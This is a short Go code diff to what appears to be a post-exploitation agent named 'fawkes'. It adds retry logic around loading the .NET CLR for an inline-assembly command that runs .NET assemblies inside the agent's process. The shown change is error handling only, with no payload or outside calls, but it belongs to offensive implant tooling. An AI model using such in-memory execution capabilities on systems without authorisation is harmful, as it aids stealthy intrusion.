@@ -35,6 +35,7 @@ import (
 	"runtime"
 	"strings"
 	"sync"
+	"time"
 
 	"fawkes/pkg/structs"
 
@@ -141,10 +142,24 @@ func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult
 			output.WriteString(fmt.Sprintf("Warning: Could not redirect output: %v\n", err))
 		}
 
-		runtimeHost, err = clr.LoadCLR("v4")
-		if err != nil {
+		// Retry LoadCLR up to 3 times — go-clr's GetInterface call sometimes
+		// returns a spurious "file not found" error on first invocation
+		var loadErr error
+		for attempt := 1; attempt <= 3; attempt++ {
+			runtimeHost, loadErr = clr.LoadCLR("v4")
+			if loadErr == nil {
+				break
+			}
+			if strings.Contains(loadErr.Error(), "cannot find the file") {
+				output.WriteString(fmt.Sprintf("[*] CLR load attempt %d: transient error, retrying...\n", attempt))
+				time.Sleep(500 * time.Millisecond)
+				continue
+			}
+			break
+		}
+		if loadErr != nil {
 			assemblyMutex.Unlock()
-			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", err))
+			output.WriteString(fmt.Sprintf("[!] Error loading CLR: %v\n", loadErr))
 			return structs.CommandResult{
 				Output:    output.String(),
 				Status:    "error",
